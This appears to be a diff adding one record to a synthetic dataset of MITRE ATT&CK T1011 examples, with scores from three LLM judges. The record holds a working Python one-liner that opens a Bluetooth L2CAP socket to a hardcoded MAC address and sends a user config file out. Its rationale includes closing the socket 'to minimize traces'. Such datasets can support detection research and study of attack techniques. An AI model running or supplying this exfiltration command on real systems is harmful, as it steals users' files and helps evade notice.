@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('38:18:4C:AA:BB:CC', 0x1001)); p=os.path.expanduser('~/.config/user-dirs.dirs'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Exfiltrates via Bluetooth L2CAP on a dynamic PSM (0x1001), using a medium distinct from the primary communication channel in line with T1011.",
+  "rationale_steps": [
+    "Select Bluetooth L2CAP to leverage a non-IP transport path.",
+    "Connect to a dynamic PSM (0x1001) to avoid common service endpoints.",
+    "Read a user config file and send its raw bytes via L2CAP.",
+    "Close the socket promptly to minimize traces."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-3ac447bb",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes/parentheses, valid socket constants, and proper statement separation via semicolons.",
+        "semantic_score": 4,
+        "semantic_justification": "It reads a local file and sends its contents over a Bluetooth L2CAP socket to a specified MAC/PSM, matching T1011, though success depends on a reachable listening service and appropriate Bluetooth permissions/pairing.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:30:33.540150Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced parentheses, proper semicolons as statement separators, valid string quoting, and correct Python socket API calls.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements T1011 by using Bluetooth L2CAP (AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP) as an alternative network medium to exfiltrate a user configuration file, though PSM 0x1001 is in the dynamic range and requires the remote device to be listening on that specific PSM, and L2CAP raw socket access on Linux typically requires elevated privileges (CAP_NET_RAW) despite the 'None' privilege claim.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:10:48.763350Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly formed with correct module imports, balanced parentheses and quotes, and valid socket constants for the Linux platform.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements Bluetooth L2CAP communication to exfiltrate a configuration file, perfectly aligning with the MITRE ATT&CK T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:10:50.703607Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
